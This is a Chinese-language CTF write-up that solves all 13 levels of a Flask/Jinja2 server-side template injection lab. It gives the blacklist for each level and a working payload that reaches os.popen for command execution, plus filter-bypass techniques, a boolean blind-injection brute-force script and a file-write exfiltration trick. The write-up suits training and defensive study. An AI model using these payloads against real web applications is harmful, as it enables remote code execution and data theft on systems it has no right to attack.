# SSTILab（X3NNY/sstilabs）13 关全通

> 平台：NSSCTF 动态实例 —— `http://node5.anna.nssctf.cn:<端口>/level/N`（几小时回收，端口会变；本会话用过 25208 / 21554 / 29371）
> 后端：Werkzeug/2.0.1 + Python/3.9.6 + Flask 1.1.1
> 时间：2026-10-11 起，2026-10-12 全通 ｜ 进度：**13 / 13 关**
> 可复跑脚本：`sstilab_solve.py`（换实例直接重跑）｜ 实测输出：`sstilab_solve_output.txt`

## 一、题目公共信息

| 项 | 内容 |
|---|---|
| 入口 | `GET /level/N` 返回页面；`POST /level/N` 才是注入 |
| 注入参数 | 表单参数 `code`（页面 `<input name="code">`） |
| 响应格式 | 成功 → `Hello <渲染结果>`；抛异常 → `No this level`；被拦 → `Hello WAF` |
| flag 位置 | `/app/flag`（**不在** `/flag`） |
| 源码 | `/app/app.py`、`/app/level/level.py`（13 关黑名单都在里面） |

```python
@app.route('/level/<int:lev>', methods=['GET', 'POST'])
def level1(lev):
    if request.method == "GET":
        return render_template("level.html", level=lev)
    try:
        code = request.form.get('code')
        res = getattr(level, 'level' + str(lev))(code)      # 每关的黑名单
        return render_template_string("Hello %s" % res)      # 注入点
    except Exception:
        return "No this level"
```

两句话本质：漏洞点是「用户输入被拼进模板源」；13 关的差别只在 `levelN(code)` 的黑名单。

一条贯穿全局的规律：黑名单查的是**你发出去的原文**，而 `~` 拼接在渲染时生效、`\x5f` 转义在编译时还原 —— 检查在前、还原在后，中间那道缝就是绕过点。

## 二、13 关总览

| 关 | 黑名单 / 机制 | 一句话绕过 |
|---|---|---|
| 1 | 无 | 直接用框架全局链 |
| 2 | `{{` | 换定界符：`{% print(...) %}` |
| 3 | 盲注（只回 correct / wrong） | 布尔 oracle 或写文件外带 |
| 4 | `[` `]` | 中括号换点号：`.os` |
| 5 | `'` `"` | 只把命令放参数：`request.form.cmd` |
| 6 | `_` | 只把 `__globals__` 写转义：`\x5f` |
| 7 | `.` | 点号换中括号：`['键']` |
| 8 | class arg form value data request init global open mro base attr | 关键词用 `~` 切碎 |
| 9 | 数字 `0-9` | 全局链本来就不用数字 |
| 10 | 预置 `config=None` `self=None` | 换 `lipsum` 当起点 |
| 11 | `'` `"` `+` request `.` `[` `]` | `dict(名=1)\|first` 造字符串 + `~` 拼命令 |
| 12 | `_` `.` 数字 `\` `'` `"` `[` `]` | 只把 `__globals__` 和命令放参数 |
| 13 | `_` `.` `\` `'` `"` request `+` class init arg config app self `[` `]` | 从字符串里抠下划线造 dunder |

## 三、逐关详解

### 第 1 关：无过滤

```python
def level1(code):
    return code
```

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

| 段 | 拿到什么 | 原理 |
|---|---|---|
| `lipsum` | Jinja2 的默认全局函数 | `jinja2.defaults.DEFAULT_NAMESPACE` 之一，不用传就能用 |
| `.__globals__` | `jinja2.utils` 模块的全局字典 | 函数对象携带「定义它的模块」的全局空间 |
| `['os']` | `<module 'os'>` | `jinja2/utils.py` 顶部 `import os` |
| `.popen(...)` | 可读管道 | `os.popen` 起 shell，返回能读输出的对象 |
| `.read()` | 命令输出 | **必须读**；`os.system` 没有回显 |

等价写法：`url_for.__globals__['os']`、`config.__class__.__init__.__globals__['os']`、`cycler.__init__.__globals__.os`、
`lipsum.__globals__.__builtins__.open('/app/flag').read()`。

### 第 2 关：禁 `{{`

```python
def level2(code):
    return "WAF" if "{{" in code else code
```

```jinja
{% print(lipsum.__globals__.os.popen('cat /app/flag').read()) %}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：Jinja2 有三种定界符 —— `{{ }}` 输出表达式、`{% %}` 语句块、`{# #}` 注释，它只禁了第一种。
`{% %}` 里能输出的四种手段（都实测过）：`{% print(expr) %}`、`{% set a=expr %}{% print(a) %}`、
`{% if 条件 %}LEAKED{% endif %}`（盲注地基）、`{% for i in [expr] %}LOOP{% endfor %}`。

### 第 3 关：盲注（只回 correct / wrong）

```python
def level3(code):
    try:
        render_template_string(code)     # 结果不返回
        return "correct"
    except Exception:
        return "wrong"
```

每次请求只有 1 bit。两条路：

路 1 · 布尔 oracle

```jinja
{% if lipsum.__globals__.os.popen('cat /app/flag').read().startswith('SSTILAB') %}ok{% else %}{{ 1/0 }}{% endif %}
```

实测：真条件 → `Hello correct`；`startswith('XXXX')` → `Hello wrong`。

假分支必须用**真的会抛异常**的写法（实测对照）：

| 写法 | 结果 | 原因 |
|---|---|---|
| `{{1/0}}` | wrong | ZeroDivisionError |
| `{{ [].pop() }}` | wrong | IndexError（方法调用） |
| `{{ 'a'.nope.x }}` | wrong | UndefinedError |
| `{{ [][0] }}` | **correct** | Jinja2 把 LookupError 吞成 Undefined，**不抛异常** |

路 2 · 副作用外带（更省事，推荐先试）

```jinja
{% set x = lipsum.__globals__.os.popen('cat /app/flag > /app/static/l3.txt').read() %}
```

实测：`Hello correct`，随后 `GET /static/l3.txt` → `SSTILAB{enjoy_flask_ssti}`。
前提：有写权限（本题 `uid=0`）+ 静态目录对外可访问（Flask 默认挂 `/static`）。

### 脚本思路（最简版，20 行）

一句话：**把「flag 是什么」翻译成一堆只能回答是/否的小问题，一个一个问** —— 第 3 关每次请求只带回 1 bit，
脚本干的事就是「提问 → 读那 1 bit → 缩小范围 → 再问」。

```python
import requests

URL = "http://<实例>/level/3"
READ = "lipsum.__globals__.os.popen('cat /app/flag').read()"
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"


def ask(cond):                    # 问一个问题：条件真吗？
    code = "{% if " + cond + " %}a{% else %}{{1/0}}{% endif %}"
    return requests.post(URL, data={"code": code}).text.endswith("correct")


flag = ""
for _ in range(50):               # 最多猜 50 位
    for c in CHARS:               # 每位逐个字符试
        if ask(READ + ".startswith('" + flag + c + "')"):
            flag += c             # 命中就固定下来，前缀变长一位
            print(flag)
            break
    else:                         # 一个字符都没命中 -> 读到头了
        break
    if flag.endswith("}"):
        break
print("flag =", flag)
```

| 块 | 作用 | 关键点 |
|---|---|---|
| `data={"code": ...}` | 注入入口 | 第 3 关是 POST，参数名 `code` |
| `READ` | 被问的对象 | 就是第 1 关那条链，原封不动 |
| `ask(cond)` | oracle：把条件变成响应差异 | 真 → 输出 `a` 走正常分支；假 → `{{1/0}}` 抛异常 → wrong |
| `startswith('前缀+c')` | 把「第几位是什么」换成「是不是以…开头」 | 模板里回答不了「第 6 位是几」，但能回答「整串是不是以 `flag{l` 开头」 |
| `for c in CHARS` | 逐字符试 | 命中就把前缀加长一位 |
| `for...else: break` | 终止条件 | 一个字符都不命中 = 读到头 |
| `endswith("}")` | 提前收工 | flag 以 `}` 结尾 |

实测（本地复刻靶机）：**856 次请求、3.3 秒**，把 31 个字符一位不差问出来。

| 方法 | 思路 | 31 位要多少次请求 |
|---|---|---|
| 前缀法（上面这个） | 一位一位试字符 | 856 |
| 二分法 | 一位一位折半逼近（字符能比大小） | 242（只改 `ask` 里那个条件） |

判断顺序：**先试外带（写文件 / 报错 / 时间），外带全封了再上盲注脚本。**
> 配套脚本（离线也能练）：
> `sstilab_level3_blind.py` —— 路线 A（写文件外带）+ 路线 B（布尔盲注，二分法/前缀法两种爆破），换实例只改 `--base`；
> `lab\level3_emulator.py` —— 本地复刻这一关的靶机（同样只回 correct / wrong），Windows 上用 `--read open` 跑。
> 用法见脚本头部注释。
### 第 4 关：禁 `[` `]`

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：`__globals__` 是字典，字典的点号取值**会回退到下标**（Jinja2 的 `.` 先 getattr、失败再 getitem），所以 `['os']` 能写成 `.os`。
另一条：`|attr('__getitem__')('os')`（`|attr` 只做 getattr，必须显式走 `__getitem__`）。

### 第 5 关：禁 `'` `"`

引号被禁 → 属性名用点号就行（点号不需要引号），**只有命令躲不开**，把它放进请求参数：

```jinja
{{ lipsum.__globals__.os.popen(request.form.cmd).read() }}
```

POST 时带上 `cmd=cat /app/flag`（想放查询串就把 payload 里的 `request.form.cmd` 改成 `request.args.cmd`）

实测：`Hello SSTILAB{enjoy_flask_ssti}`（payload 里一个引号都没有）

### 第 6 关：禁 `_`

```jinja
{{ lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：`\x5f` 是下划线转义，**编译期**才还原成 `_`；过滤看的是原始输入（里面没有下划线）。只需替换这一个带下划线的名字，其余零件（点号、引号）第 6 关都不禁。

### 第 7 关：禁 `.`

```jinja
{{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：点号没了就改用中括号 —— `getitem` 对字符串参数会**反向回退到属性**，所以取函数属性也行；另一条路是 `|attr('名字')`。

### 第 8 关：关键词黑名单

```python
bl = ["class", "arg", "form", "value", "data", "request", "init", "global", "open", "mro", "base", "attr"]
```

名单很毒：`__globals__` 含 `global`、`popen`/`open` 含 `open`、`__init__` 含 `init`、`__mro__` 含 `mro`、
`|attr(...)` 含 `attr`、`request`/`form` 被点名。出路是**把词切碎**（`~` 到渲染时才拼起来）：

```jinja
{{ lipsum['__glo'~'bals__']['os']['pop'~'en']('cat /app/flag')['read']() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

要点：只需切碎两个被点名的词 —— `__globals__` → `['__glo'~'bals__']`（避开 `global`）、`popen` → `['pop'~'en']`（避开 `open`）；其余零件照旧。

### 第 9 关：禁数字 `0-9`

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：这条链**本来就不需要数字** —— 只有「枚举 `__subclasses__()` 下标」那条路才要写数字；框架全局链全是名字，天然免疫。

### 第 10 关：预置 `config` / `self` 为空

```python
return "{% set config=None%}{% set self=None%}" + code
```

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

原理：它只把 `config` / `self` 两个名字置空，`lipsum`（以及 `cycler` / `joiner` / `namespace`）不受影响。
思路：遇到「某个名字被废掉」时，先想**同一类起点还有几个**。

### 第 11 关：禁 `'` `"` `+` request `.` `[` `]`

引号、点号、中括号全禁，参数通道（`request`）也被堵死 —— 只能在模板内部造字符串：

```jinja
{% set g = lipsum|attr(dict(__globals__=1)|first) %}{% set s = g|attr(dict(get=1)|first)(dict(__file__=1)|first)|first %}{{ g|attr(dict(get=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)((dict(cat=1)|first)~((lipsum|string)|first)~s~(dict(ap=1)|first)~(dict(p=1)|first)~s~(dict(flag=1)|first))|attr(dict(read=1)|first)() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`

| 要造的东西 | 怎么造 | 说明 |
|---|---|---|
| 任意名字字符串 | `dict(名字=1)\|first` | kwargs 的键不用引号，`\|first` 取出键名 → `'__globals__'` |
| 斜杠 `/` | `...('__file__')\|first` | `jinja2.utils.__file__` 路径首字符就是 `/` |
| 空格 | 干脆不用 | 命令写 `cat</app/flag`（shell 重定向，等价且无空格） |

拼接全部用 `~`（`+` 被禁）。

### 第 12 关：禁 `_` `.` 数字 `\` `'` `"` `[` `]`

下划线和数字都被禁 → 连 `dict(a=1)` 里的 `1` 都不能写（改用 `true`），名字只能从**查询参数**取：

```jinja
{% set r = request|attr(dict(args=true)|first)|attr(dict(get=true)|first) %}{{ lipsum|attr(r(dict(a=true)|first))|attr(dict(get=true)|first)(dict(os=true)|first)|attr(dict(popen=true)|first)(r(dict(b=true)|first))|attr(dict(read=true)|first)() }}
```

查询串一并带上：`?a=__globals__&b=cat /app/flag`

实测：`Hello SSTILAB{enjoy_flask_ssti}`

要点：取参数不用点号 —— `request|attr(dict(args=true)|first)|attr(dict(get=true)|first)` 就是 `request.args.get`；
数值用 `true` 占位；参数只有两个（`__globals__` 和命令），其余名字用 `dict(名=true)|first` 就地造。

### 第 13 关：全禁（最难）

```python
bl = ['_', '.', '\\', "'", '"', 'request', '+', 'class', 'init', 'arg', 'config', 'app', 'self', '[', ']']
```

`request` 被点名 → 参数通道没了；下划线又被禁 → 连 `__globals__` 都写不出来。解法是**从字符串里抠下划线**：

```jinja
{% set u = lipsum|string|list|batch(19)|first|last %}{% set g = lipsum|attr((u~u)~(dict(globals=true)|first)~(u~u)) %}{% set q = g|attr(dict(get=true)|first) %}{% set s = q((u~u)~(dict(file=true)|first)~(u~u))|first %}{% set c = (dict(cat=true)|first)~((lipsum|string)|first)~s~(dict(ap=true)|first)~(dict(p=true)|first)~s~(dict(flag=true)|first) %}{{ q(dict(os=true)|first)|attr(dict(popen=true)|first)(c)|attr(dict(read=true)|first)() }}
```

实测：`Hello SSTILAB{enjoy_flask_ssti}`（payload 共 439 字符）

| 要造的东西 | 怎么造 | 说明 |
|---|---|---|
| 下划线 `_` | `lipsum\|string\|list\|batch(19)\|first\|last` | `lipsum` 的 repr 是 `<function generate_lorem_ipsum at 0x...>`，第 19 个字符正是 `_`（实测） |
| `__globals__` | `(u~u)~(dict(globals=true)\|first)~(u~u)` | 用抠出的下划线拼 dunder；`globals` 本身不含下划线 |
| 斜杠 `/` | `...('__file__')\|first` | 取 `jinja2/utils.py` 路径首字符 |
| 省长度 | `dict(get=true)|first` | 对字典来说 `get('os')` 就够，不必造 `__getitem__`（少 8 个字符） |
| `app` | `dict(ap=true)\|first~dict(p=true)\|first` | `app` 在黑名单里，必须切两半 |
| 命令无空格 | `cat</app/flag` | 用 shell 重定向代替空格 |

`url_for`、`get_flashed_messages` 这些名字自带下划线，第 13 关也写不出来 —— 所以这一关**不能**走参数通道，
只能用 `lipsum` 这条纯字母名字的链。

## 四、可复跑脚本

```powershell
cd D:\deepseek\task8\4-靶场实践
python sstilab_solve.py                                     # 默认实例
python sstilab_solve.py http://node5.anna.nssctf.cn:29371   # 指定实例
```

结果：`13 / 13 关通过`。脚本把 13 关 payload 全部固化（含 L11~L13 的构造件），换实例直接重跑。

## 五、方法论总结

三抽屉模型（遇到过滤就在这三个抽屉里换零件）

| 抽屉 | 有哪几种 | 什么时候用 |
|---|---|---|
| 字符串从哪来 | 字面量 / `~` 拼接 / `\x5f` 转义 / `dict(名=1)\|first` / 请求参数 / 从对象抠字符 | 引号、关键词、下划线被禁 |
| 属性怎么取 | `.` / `['键']` / `\|attr('键')` / `\|attr('__getitem__')('键')` / `\|first` `\|last` | 点号、中括号被禁 |
| 结果怎么写 | `{{ }}` / `{% print %}` / `{% if %}字面量{% endif %}` | 定界符被禁 / 盲注 |

时间差原理：黑名单查的是原文；`~` 在渲染期拼接、`\x5f` 在编译期还原 → 检查在前、还原在后。

三条通用意识：先探规则再打；黑名单只查 `code`（查询参数/表单字段是自由通道）；名字写不出来就现造。

## 六、踩坑记录

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| 参数放错位置 | 第 5 关回 `No this level` | payload 用 `request.args`（查询串），参数却放在 POST body | 用 `request.form`，或把参数放 query |
| `SESSION_COOKIE_PATH` 不是 `/` | 第 11 关命令变成 `cat<NoneappNoneflag` | Flask 该配置默认值是 **None** | 换成 `__file__` 取斜杠 |
| 第 12 关数字黑名单 | `dict(a=1)` 直接被拦 | 黑名单含 `0-9` | 值改用 `true` |
| 第 13 关写了 `url_for` | 回 `Hello WAF` | `url_for` 自带下划线，被 `_` 拦 | 用纯字母的 `lipsum` 当起点 |
| 第 13 关写了 `app` | 回 `Hello WAF` | `app` 在关键词黑名单里 | 拆成 `dict(ap=true)\|first~dict(p=true)\|first` |
| 假分支用 `{{ [][0] }}` | 盲注一直回 correct | Jinja2 把 LookupError 吞成 Undefined | 用 `{{1/0}}` 或 `{{ [].pop() }}` |
| Python 里写 payload 被 `%` 坑 | `ValueError: unsupported format character '}'` | payload 里有 `%}`，和 `%` 格式化冲突 | 用字符串拼接，别用 `%` 格式化 |